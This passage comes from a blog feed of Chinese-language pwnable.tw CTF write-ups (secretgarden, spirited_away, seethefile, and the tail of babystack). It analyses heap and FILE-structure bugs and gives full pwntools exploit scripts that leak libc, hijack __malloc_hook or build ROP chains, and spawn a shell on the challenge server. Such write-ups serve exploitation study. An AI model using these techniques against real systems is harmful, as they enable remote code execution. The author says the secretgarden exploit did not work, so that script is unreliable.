port)</span><br><span class="line">libc = ELF(&quot;libc_64.so.6&quot;)</span><br><span class="line">one = [0xef6c4, 0x45216, 0x4526a, 0xf0567]</span><br><span class="line">guess = buf(0x10, &quot;&quot;)</span><br><span class="line">login(&apos;\x00&apos;+&apos;a&apos;*0x57)</span><br><span class="line">copy(&apos;a&apos;*0x40)</span><br><span class="line">logout()</span><br><span class="line"># 0x7ffb87ac0000---0x7ffb87b2ffc4 &lt;__GI__IO_setvbuf+324&gt;</span><br><span class="line">libc_base=u64(buf(6,&quot;a&quot;*0x10+&apos;1\n&apos;+&apos;a&apos;*6)[0x18:].ljust(8, &apos;\x00&apos;))-324-0x4F730-libc.symbols[&apos;__libc_start_main&apos;]</span><br><span class="line">one_gadget = libc_base + one[3]</span><br><span class="line"></span><br><span class="line">payload=&apos;\x00&apos;+&apos;a&apos;*0x3f+guess+&apos;a&apos;*0x18+p64(one_gadget)</span><br><span class="line">login(payload)</span><br><span class="line">copy(&apos;a&apos; * 0x10)</span><br><span class="line">ex()</span><br><span class="line"></span><br><span class="line">success(&quot;libc_base = &quot;+hex(libc_base))</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">pwn(ip, port, 0)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&apos;&apos;&apos;</span><br><span class="line">0x45216 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="line">constraints:</span><br><span class="line">  rax == NULL</span><br><span class="line"></span><br><span class="line">0x4526a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x30] == NULL</span><br><span class="line"></span><br><span class="line">0xef6c4 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x50] == NULL</span><br><span class="line"></span><br><span class="line">0xf0567 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x70] == NULL</span><br><span class="line">&apos;&apos;&apos;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;babystack&quot;&gt;&lt;a href=&quot;#babystack&quot; class=&quot;headerlink&quot; title=&quot;babystack&quot;&gt;&lt;/a&gt;babystack&lt;/h1&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;t</summary>
      
    
    
    
    <category term="oj" scheme="p1Kk.github.io/categories/oj/"/>
    
    
    <category term="pwn" scheme="p1Kk.github.io/tags/pwn/"/>
    
    <category term="wp" scheme="p1Kk.github.io/tags/wp/"/>
    
    <category term="tw" scheme="p1Kk.github.io/tags/tw/"/>
    
  </entry>
  
  <entry>
    <title>pwnable.tw secretgarden wp</title>
    <link href="p1Kk.github.io/2020/07/30/tw/tw%20secretgarden/"/>
    <id>p1Kk.github.io/2020/07/30/tw/tw%20secretgarden/</id>
    <published>2020-07-29T16:00:00.000Z</published>
    <updated>2020-10-04T12:09:16.139Z</updated>
    
    <content type="html"><![CDATA[<h1 id="secretgarden"><a href="#secretgarden" class="headerlink" title="secretgarden"></a>secretgarden</h1><pre><code>Arch:     amd64-64-littleRELRO:    Full RELROStack:    Canary foundNX:       NX enabledPIE:      PIE enabledFORTIFY:  Enabled</code></pre><p>（保护全开好可怕55</p><p>菜单</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ </span><br><span class="line">☆          Secret Garden          ☆ </span><br><span class="line">☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ </span><br><span class="line"></span><br><span class="line">  1 . Raise a flower </span><br><span class="line">  2 . Visit the garden </span><br><span class="line">  3 . Remove a flower from the garden</span><br><span class="line">  4 . Clean the garden</span><br><span class="line">  5 . Leave the garden</span><br></pre></td></tr></table></figure><p>remove没有置零，有double free漏洞</p><ol><li>申请unsorted bin泄露libc</li><li>double free修改fd到__malloc_hook等，改malloc为one_gadget，不过这里，one的条件都不符合，所以需要触发<code>malloc_printerr</code></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[+] malloc_addr = 0x7f4f71258c30</span><br><span class="line">pwndbg&gt; x/10gx 0x7f4f71258c00</span><br><span class="line">0x7f4f71258c00 &lt;_IO_wide_data_0+288&gt;:0x00000000000000000x0000000000000000</span><br><span class="line">0x7f4f71258c10 &lt;_IO_wide_data_0+304&gt;:0x00007f4f71254d600x0000000000000000</span><br><span class="line">0x7f4f71258c20 &lt;__memalign_hook&gt;:0x00007f4f70f044800x00007f4f70f05800</span><br><span class="line">0x7f4f71258c30 &lt;__malloc_hook&gt;:0x00000000000000000x0000000000000000</span><br><span class="line">0x7f4f71258c40 &lt;main_arena&gt;:0x00000000000000000x0000000000000000</span><br><span class="line">pwndbg&gt; x/10gx 0x7f4f71258c30-0x23</span><br><span class="line">0x7f4f71258c0d &lt;_IO_wide_data_0+301&gt;:0x4f71254d600000000x000000000000007f -------&gt; fake chunk</span><br><span class="line">0x7f4f71258c1d:0x4f70f044800000000x4f70f0580000007f</span><br><span class="line">0x7f4f71258c2d &lt;__realloc_hook+5&gt;:0x000000000000007f0x0000000000000000</span><br><span class="line">0x7f4f71258c3d:0x00000000000000000x0000000000000000</span><br><span class="line">0x7f4f71258c4d &lt;main_arena+13&gt;:0x00000000000000000x0000000000000000</span><br></pre></td></tr></table></figure><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><p>本地泄露是libc基址，但是远程，偏移就不对了，我也不知道怎么测555。而且本地double free并不能成功，但是感觉没毛病</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line">#!usr/bin/python</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line"></span><br><span class="line">binary = &quot;./secretgarden&quot;</span><br><span class="line">ip = &quot;chall.pwnable.tw&quot;</span><br><span class="line">port = 10203</span><br><span class="line">elf = ELF(binary)</span><br><span class="line"></span><br><span class="line">def menu(choice):</span><br><span class="line">io.sendlineafter(&quot;choice : &quot;, str(choice))</span><br><span class="line"></span><br><span class="line">def sraise(length, name, color):</span><br><span class="line">menu(1)</span><br><span class="line">io.sendlineafter(&quot;name :&quot;, str(length))</span><br><span class="line">io.sendafter(&quot;name of flower :&quot;, name)</span><br><span class="line">io.sendlineafter(&quot;the flower :&quot;, color)</span><br><span class="line"></span><br><span class="line">def svisit():</span><br><span class="line">menu(2)</span><br><span class="line"></span><br><span class="line">def sremove(idx):</span><br><span class="line">menu(3)</span><br><span class="line">io.sendlineafter(&quot;garden:&quot;, str(idx))</span><br><span class="line"></span><br><span class="line">def sclean():</span><br><span class="line">menu(4)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def pwn(ip, port, debug):</span><br><span class="line">global io</span><br><span class="line">if debug == 1:</span><br><span class="line">io = process(binary)</span><br><span class="line">libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span><br><span class="line">one = [0x4f365, 0x4f3c2, 0x10a45c]</span><br><span class="line">main_arena_offset = 0x3ebc40</span><br><span class="line">else:</span><br><span class="line">io = remote(ip, port)</span><br><span class="line">libc = ELF(&quot;libc_64.so.6&quot;)</span><br><span class="line">one = [0x45216, 0x4526a, 0xef6c4, 0xf0567]</span><br><span class="line">main_arena_offset = 0x3c3b20</span><br><span class="line"></span><br><span class="line">success(&quot;main_arena_offset = &quot;+hex(libc.sym[&apos;__malloc_hook&apos;]+0x10))</span><br><span class="line">sraise(0x30, &quot;a&quot;*8, &quot;y&quot;)# 0</span><br><span class="line">sraise(0x500, &quot;a&quot;*16, &quot;y&quot;)# 1</span><br><span class="line">sraise(0x30, &quot;a&quot;*8, &quot;y&quot;)# 2</span><br><span class="line">sremove(0)</span><br><span class="line">sremove(1)</span><br><span class="line">sraise(0x400, &quot;b&quot;*8, &quot;y&quot;)# 3</span><br><span class="line"># gdb.attach(io)</span><br><span class="line">svisit()</span><br><span class="line">io.recvuntil(&quot;b&quot;*8)</span><br><span class="line">libc_base = u64(io.recv(6).ljust(8, &apos;\x00&apos;)) - 0x480 - main_arena_offset</span><br><span class="line">malloc_addr = libc_base + libc.sym[&apos;__malloc_hook&apos;]</span><br><span class="line">one = libc_base + one[2]</span><br><span class="line">success(&quot;libc_base = &quot;+hex(libc_base))</span><br><span class="line">success(&quot;malloc_addr = &quot;+hex(malloc_addr))</span><br><span class="line">success(&quot;one_addr = &quot;+hex(one))</span><br><span class="line"></span><br><span class="line">sraise(0x68, &quot;c&quot;*8, &quot;y&quot;)# 4</span><br><span class="line">sraise(0x68, &quot;c&quot;*8, &quot;y&quot;)# 5</span><br><span class="line">sremove(4)</span><br><span class="line">sremove(5)</span><br><span class="line">sremove(4)</span><br><span class="line">sraise(0x68, p64(malloc_addr-0x23), &quot;y&quot;)# 6</span><br><span class="line"></span><br><span class="line">sraise(0x68, &quot;d&quot;*8, &quot;y&quot;)# 7</span><br><span class="line">sraise(0x68, &quot;d&quot;*8, &quot;y&quot;)# 8</span><br><span class="line">sraise(0x68, &quot;e&quot;*0x13+p64(one), &quot;y&quot;)# 9</span><br><span class="line"></span><br><span class="line">gdb.attach(io)</span><br><span class="line"></span><br><span class="line"># io.sendlineafter(&quot;choice : &quot;, &quot;1&quot;)</span><br><span class="line"></span><br><span class="line">sremove(8)</span><br><span class="line">sremove(8)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">pwn(ip, port, 1)</span><br></pre></td></tr></table></figure><blockquote><p><a href="https://blog.ivan0.com/2018/11/18/pwnable-tw-secretgarden/" target="_blank" rel="noopener">https://blog.ivan0.com/2018/11/18/pwnable-tw-secretgarden/</a></p><p>这个给了两种解法，挺好</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;secretgarden&quot;&gt;&lt;a href=&quot;#secretgarden&quot; class=&quot;headerlink&quot; title=&quot;secretgarden&quot;&gt;&lt;/a&gt;secretgarden&lt;/h1&gt;&lt;pre&gt;&lt;code&gt;Arch:     amd64-64-lit</summary>
      
    
    
    
    <category term="oj" scheme="p1Kk.github.io/categories/oj/"/>
    
    
    <category term="pwn" scheme="p1Kk.github.io/tags/pwn/"/>
    
    <category term="wp" scheme="p1Kk.github.io/tags/wp/"/>
    
    <category term="tw" scheme="p1Kk.github.io/tags/tw/"/>
    
  </entry>
  
  <entry>
    <title>pwnable.tw spirited_away wp</title>
    <link href="p1Kk.github.io/2020/07/29/tw/tw%20spirit/"/>
    <id>p1Kk.github.io/2020/07/29/tw/tw%20spirit/</id>
    <published>2020-07-28T16:00:00.000Z</published>
    <updated>2020-07-29T17:44:01.610Z</updated>
    
    <content type="html"><![CDATA[<h1 id="spirited-away"><a href="#spirited-away" class="headerlink" title="spirited_away"></a>spirited_away</h1><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><p>比较明显的漏洞就是reason未清零，可以进行地址泄露</p><p>另一个漏洞还是挺巧妙的，在<code>sprintf</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sprintf(&amp;v1, &quot;%d comment so far. We will review them as soon as we can&quot;, cnt);</span><br><span class="line">char v1; // [esp+10h] [ebp-E8h]</span><br><span class="line">size_t nbytes; // [esp+48h] [ebp-B0h]</span><br></pre></td></tr></table></figure><p>v1和nbytes之间的距离是0x38</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ python</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>length = len(<span class="string">"1 comment so far. We will review them as soon as we can"</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">print</span> hex(length)</span><br><span class="line"><span class="number">0x37</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>length = len(<span class="string">"11 comment so far. We will review them as soon as we can"</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">print</span> hex(length)</span><br><span class="line"><span class="number">0x38</span></span><br></pre></td></tr></table></figure><p>也就是说 cn &gt;= 100 时，就可以溢出到 nbytes 为”n”即 0x6e，可以对name comment读取造成溢出</p><ol><li><p>通过打印reason泄露出stack和libc地址</p></li><li><p>在reason处伪造chunk，然后comment溢出可以覆盖name，伪造name指针指向reason+0x10，这样free后再次malloc到reason。注意伪造的chunk的合法性。</p></li><li><p>再次写name，即写到reason处，溢出rop</p></li></ol><p>（很烦的是，接收的时候粘连，到10的时候还要部分发送</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!usr/bin/python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">binary = <span class="string">"./spirited_away"</span></span><br><span class="line">ip = <span class="string">"chall.pwnable.tw"</span></span><br><span class="line">port = <span class="number">10204</span></span><br><span class="line">elf = ELF(binary)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sname</span><span class="params">(name)</span>:</span></span><br><span class="line">io.sendlineafter(<span class="string">"name: "</span>, name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sage</span><span class="params">(age)</span>:</span></span><br><span class="line">io.sendlineafter(<span class="string">"age: "</span>, str(age))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sreason</span><span class="params">(reason)</span>:</span></span><br><span class="line">io.sendafter(<span class="string">"movie? "</span>, reason)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">scomment</span><span class="params">(comment)</span>:</span></span><br><span class="line">io.sendafter(<span class="string">"your comment: "</span>, comment)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">again</span><span class="params">(choice)</span>:</span></span><br><span class="line">io.sendlineafter(<span class="string">"leave another comment? &lt;y/n&gt;: "</span>, choice)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">all</span><span class="params">(n, a, rs, com, ch, r=False)</span>:</span></span><br><span class="line">sname(n)</span><br><span class="line">sage(a)</span><br><span class="line">sreason(rs)</span><br><span class="line">scomment(com)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line"><span class="keyword">if</span> r:</span><br><span class="line">gdb.attach(io)</span><br><span class="line">again(ch)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">all2</span><span class="params">(a, rs, ch, r=False)</span>:</span></span><br><span class="line">sage(a)</span><br><span class="line">sreason(rs)</span><br><span class="line"><span class="keyword">if</span> r:</span><br><span class="line">gdb.attach(io)</span><br><span class="line">again(ch)</span><br><span class="line"><span class="comment"># sleep(1)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span><span class="params">(ip, port, debug)</span>:</span></span><br><span class="line"><span class="keyword">global</span> io</span><br><span class="line"><span class="keyword">if</span> debug == <span class="number">1</span>:</span><br><span class="line">io = process(binary)</span><br><span class="line">libc = ELF(<span class="string">"/lib/i386-linux-gnu/libc.so.6"</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">io = remote(ip, port)</span><br><span class="line">libc = ELF(<span class="string">"libc_32.so.6"</span>)</span><br><span class="line"></span><br><span class="line">sname(<span class="string">"kk"</span>)</span><br><span class="line">sage(<span class="number">11</span>)</span><br><span class="line">sreason(<span class="string">"x"</span>*<span class="number">0x38</span>)</span><br><span class="line">scomment(<span class="string">"aaaa"</span>)</span><br><span class="line">io.recvuntil(<span class="string">"x"</span>*<span class="number">0x38</span>)</span><br><span class="line">stack_reason = u32(io.recv(<span class="number">4</span>)) - <span class="number">0x70</span></span><br><span class="line"><span class="comment"># profile_addr = u32(io.recv(4))# none _dl_runtime_profile</span></span><br><span class="line">io.recv(<span class="number">4</span>)</span><br><span class="line">fflush_addr = u32(io.recv(<span class="number">4</span>))</span><br><span class="line">libc_base = fflush_addr - <span class="number">0xb</span> - libc.sym[<span class="string">'fflush'</span>]</span><br><span class="line">sys_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">binsh_addr = libc_base + libc.search(<span class="string">"/bin/sh\x00"</span>).next()</span><br><span class="line">success(<span class="string">"stack_reason = "</span>+hex(stack_reason))</span><br><span class="line">success(<span class="string">"libc_base = "</span> +hex(libc_base))</span><br><span class="line">success(<span class="string">"sys_addr = "</span>+hex(sys_addr))</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">again(<span class="string">"y"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">9</span>):</span><br><span class="line">all(<span class="string">"kk"</span>, <span class="number">11</span>, <span class="string">"xxxx"</span>, <span class="string">"aaaa"</span>, <span class="string">"y"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">90</span>):</span><br><span class="line">all2(<span class="number">11</span>, <span class="string">"xxxx"</span>, <span class="string">"y"</span>)</span><br><span class="line"></span><br><span class="line">reason = p32(<span class="number">0</span>) + p32(<span class="number">0x41</span>) + <span class="string">'a'</span>*<span class="number">0x38</span> + p32(<span class="number">0</span>) + p32(<span class="number">0x11</span>)</span><br><span class="line">comment = <span class="number">0x54</span>*<span class="string">'b'</span> + p32(stack_reason+<span class="number">0x8</span>)</span><br><span class="line">all(<span class="string">"kk"</span>, <span class="number">11</span>, reason, comment, <span class="string">"y"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">name = <span class="string">'b'</span>*<span class="number">0x4c</span> + p32(sys_addr) + p32(<span class="number">0</span>) + p32(binsh_addr)</span><br><span class="line">all(name, <span class="number">11</span>, <span class="string">'xxxx'</span>, <span class="string">'aaaa'</span>, <span class="string">'n'</span>)</span><br><span class="line"></span><br><span class="line">success(<span class="string">"stack_reason = "</span>+hex(stack_reason))</span><br><span class="line">success(<span class="string">"libc_base = "</span> +hex(libc_base))</span><br><span class="line">success(<span class="string">"sys_addr = "</span>+hex(sys_addr))</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">pwn(ip, port, <span class="number">0</span>)</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;spirited-away&quot;&gt;&lt;a href=&quot;#spirited-away&quot; class=&quot;headerlink&quot; title=&quot;spirited_away&quot;&gt;&lt;/a&gt;spirited_away&lt;/h1&gt;&lt;h2 id=&quot;分析&quot;&gt;&lt;a href=&quot;#分析&quot; cla</summary>
      
    
    
    
    <category term="oj" scheme="p1Kk.github.io/categories/oj/"/>
    
    
    <category term="pwn" scheme="p1Kk.github.io/tags/pwn/"/>
    
    <category term="wp" scheme="p1Kk.github.io/tags/wp/"/>
    
    <category term="tw" scheme="p1Kk.github.io/tags/tw/"/>
    
  </entry>
  
  <entry>
    <title>pwnable.tw seethefile wp</title>
    <link href="p1Kk.github.io/2020/07/22/tw/tw%20seethefile/"/>
    <id>p1Kk.github.io/2020/07/22/tw/tw%20seethefile/</id>
    <published>2020-07-21T16:00:00.000Z</published>
    <updated>2020-07-22T06:52:26.935Z</updated>
    
    <content type="html"><![CDATA[<h1 id="seethefile"><a href="#seethefile" class="headerlink" title="seethefile"></a>seethefile</h1><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><p>最后exit的漏洞很明显了，再看bss，可以覆写fp，以前学了一点[IO（笔记](<a href="https://p1kk.github.io/2019/10/22/FILE" target="_blank" rel="noopener">https://p1kk.github.io/2019/10/22/FILE</a> structure used with “stream functions”/FILE structure used with “stream functions”/#libc2-23及之前版本的libc下伪造vtable劫持)…不过忘了=。=复习复习</p><p>主要看看fclose  </p><p><code>_IO_unlink_it</code>将指定FILE从_chain链表中脱链<br><code>_IO_file_close_it</code> –&gt;  <code>close</code> –&gt; 【vtable中<code>_IO_finish</code> –&gt; <code>_IO_file_finish</code> –&gt; <code>free</code>】</p><p>所以尝试将</p><p>读<code>/proc/self/maps</code>文件，打印出效果类于<code>vmmap</code>，就可以得到libc base</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ strings libc_32.so.6 | grep GNU</span><br><span class="line">GNU C Library (Ubuntu GLIBC 2.23-0ubuntu5) stable release version 2.23, by Roland McGrath et al.</span><br><span class="line">Compiled by GNU CC version 5.4.0 20160609.</span><br><span class="line">GNU Libidn by Simon Josefsson</span><br></pre></td></tr></table></figure><p>libc版本是2.23</p><p><strong>在libc2.23版本下，32位的vtable偏移为<code>0x94</code>，64位的偏移为<code>0xd8</code>。</strong></p><p>将io_file伪造成这样的效果</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p *((struct _IO_FILE_plus*)0x804B260)# name_addr</span><br><span class="line">$1 = &#123;</span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = 1852400175, </span><br><span class="line">    _IO_read_ptr = 0x68732f &lt;error: Cannot access memory at address 0x68732f&gt;, </span><br><span class="line">    _IO_read_end = 0x0, </span><br><span class="line">    _IO_read_base = 0x0, </span><br><span class="line">    _IO_write_base = 0x0, </span><br><span class="line">    _IO_write_ptr = 0x0, </span><br><span class="line">    _IO_write_end = 0x0, </span><br><span class="line">    _IO_buf_base = 0x0, </span><br><span class="line">    _IO_buf_end = 0x804b260 &lt;name&gt; &quot;/bin/sh&quot;, </span><br><span class="line">    _IO_save_base = 0x0, </span><br><span class="line">    _IO_backup_base = 0x0, </span><br><span class="line">    _IO_save_end = 0x0, </span><br><span class="line">    _markers = 0x0, </span><br><span class="line">    _chain = 0x0, </span><br><span class="line">    _fileno = 0, </span><br><span class="line">    _flags2 = 0, </span><br><span class="line">    _old_offset = 0, </span><br><span class="line">    _cur_column = 0, </span><br><span class="line">    _vtable_offset = 0 &apos;\000&apos;, </span><br><span class="line">    _shortbuf = &quot;&quot;, </span><br><span class="line">    _lock = 0x804b270 &lt;name+16&gt;, </span><br><span class="line">    _offset = 0, </span><br><span class="line">    _codecvt = 0x0, </span><br><span class="line">    _wide_data = 0x0, </span><br><span class="line">    _freeres_list = 0x0, </span><br><span class="line">    _freeres_buf = 0x0, </span><br><span class="line">    __pad5 = 0, </span><br><span class="line">    _mode = 0, </span><br><span class="line">    _unused2 = &apos;\000&apos; &lt;repeats 39 